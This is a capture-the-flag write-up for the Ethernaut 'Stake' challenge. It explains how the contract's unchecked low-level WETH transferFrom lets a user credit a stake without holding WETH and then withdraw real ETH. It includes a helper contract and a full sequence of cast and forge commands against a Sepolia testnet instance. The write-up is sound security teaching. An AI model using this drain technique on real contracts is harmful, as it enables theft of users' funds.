# Ethernaut Challenge 31 — Stake

Stake is supposed to safely handle both **native ETH** and **WETH (ERC20)** with a 1:1 value.

However, a flaw in the accounting logic allows us to break this assumption.

---

## 🎯 Goal

The challenge is solved when the following conditions are met:

- `address(stake).balance > 0`
- `totalStaked > address(stake).balance`
- `Stakers[msg.sender] == true`
- `UserStake[msg.sender] == 0`

---

## 🧠 Key Concepts

- Mixing **ETH and ERC20 accounting**
- Low-level `.call()` usage
- Missing validation of `transferFrom` return value
- Broken invariant: `totalStaked` ≠ real ETH balance

---

## 🔍 Initial Analysis

Instance:

```bash
STAKE=0x0Ae53C54BFDDA8B9c53EEd01A514c98B4a5A1de1
````

### Check WETH address

```bash
cast call $STAKE \
    "WETH()(address)" \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:

```
0xCd8AF4A0F29cF7966C051542905F66F5dca9052f
```

```bash
WETH=0xCd8AF4A0F29cF7966C051542905F66F5dca9052f
```

---

## ⚠️ Critical Observation

The contract uses low-level calls:

```solidity
(, bytes memory allowance) = WETH.call(
    abi.encodeWithSelector(0xdd62ed3e, msg.sender, address(this))
);

(bool transfered,) = WETH.call(
    abi.encodeWithSelector(0x23b872dd, msg.sender, address(this), amount)
);
```

Decode selectors:

```bash
cast 4byte 0xdd62ed3e
# allowance(address,address)

cast 4byte 0x23b872dd
# transferFrom(address,address,uint256)
```
---

## 💥 Exploit Strategy

We exploit the mismatch between:

* **internal accounting (`totalStaked`)**
* **real ETH balance**

### Steps:

1. Add ETH to the contract (via helper contract)
2. Call `StakeWETH` → increases your stake **without owning WETH**
3. Call `Unstake` → withdraw **real ETH**
4. Re-add ETH using helper → to satisfy final condition

---

## 🧪 Local Test

I reproduced the exploit locally:

📄 [StakeTest.t.sol](../../test/StakeTest.t.sol)

---

## 🏗️ Helper Contract

The helper contract can be found at: [StakeEthHelper.sol](./StakeEthHelper.sol)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IStake {
    function StakeETH() external payable;
}

contract StakeEthHelper {
    IStake public stake;

    constructor(address _stake) {
        stake = IStake(_stake);
    }

    function stakeETH() external payable {
        stake.StakeETH{value: msg.value}();
    }

    receive() external payable {}
}
```

---

## 🚀 Exploit on Sepolia

### 1. Deploy helper

```bash
forge create src/challenge-31-stake/StakeEthHelper.sol:StakeEthHelper \
  --rpc-url $SEPOLIA_RPC_URL \
  --account ethernaut \
  --broadcast \
  --constructor-args $STAKE
```

```bash
STAKE_HELPER=<DEPLOYED_ADDRESS>
```

---

### 2. Fund helper

```bash
cast send $STAKE_HELPER \
    --value 0.0045ether \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

---

### 3. First ETH stake (helper)

```bash
cast send $STAKE_HELPER \
    "stakeETH()" \
    --value 0.002ether \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

---

### 4. Approve fake WETH

```bash
cast send $WETH \
  "approve(address,uint256)" $STAKE 2000000000000000 \
  --rpc-url $SEPOLIA_RPC_URL \
  --account ethernaut
```

---

### 5. Fake WETH staking

```bash
cast send $STAKE \
    "StakeWETH(uint256)" \
    2000000000000000 \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

👉 Even with `balanceOf = 0`, this increases your stake.

---

### 6. Withdraw real ETH

```bash
cast send $STAKE \
    "Unstake(uint256)" \
    2000000000000000 \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

---

### 7. Refill ETH (helper)

```bash
cast send $STAKE_HELPER \
    "stakeETH()" \
    --value 0.002ether \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

---

## ✅ Final Verification

### ETH balance > 0

```bash
cast balance $STAKE --rpc-url $SEPOLIA_RPC_URL
```

```
0.002 ether
```

---

### totalStaked > balance

```bash
cast call $STAKE \
    "totalStaked()(uint256)" \
    --rpc-url $SEPOLIA_RPC_URL
```

```
0.004 ether
```

---

### You are a staker

```bash
cast call $STAKE \
    "Stakers(address)(bool)" \
    $MY_ADDRESS \
    --rpc-url $SEPOLIA_RPC_URL
```

```
true
```

---

### Your stake is 0

```bash
cast call $STAKE \
    "UserStake(address)(uint256)" \
    $MY_ADDRESS \
    --rpc-url $SEPOLIA_RPC_URL
```

```
0
```

